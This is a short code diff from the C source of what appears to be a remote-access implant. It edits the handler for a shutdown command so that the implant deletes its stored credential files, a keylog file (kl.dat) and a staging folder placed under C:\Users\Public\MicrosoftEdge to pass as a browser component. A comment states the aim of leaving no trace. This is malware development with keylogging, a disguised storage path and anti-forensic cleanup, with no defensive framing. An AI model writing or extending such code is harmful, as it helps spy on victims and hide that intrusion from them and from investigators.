@@ -467,12 +467,16 @@ int main(int argc, char **argv)
             RemoveDirectoryA(IMPLANT_TARGET_DIR);
             DeleteFileA(IMPLANT_STAGE_PATH);
 #endif
-            /* Remove persisted credentials — leaves no trace after shutdown */
+            /* Remove all implant files — credentials, keylog, temp dir */
             {
                 char s_cert[512], s_key[512];
                 cred_paths(s_cert, s_key, 512);
                 remove(s_cert);
                 remove(s_key);
+#ifdef _WIN32
+                DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\kl.dat");
+                RemoveDirectoryA("C:\\Users\\Public\\MicrosoftEdge");
+#endif
             }
             char *payload = "SUCCESSFULLY SHUTDOWN";
             Packet resp = {COMMAND_RESPONSE, pkt->request_id,
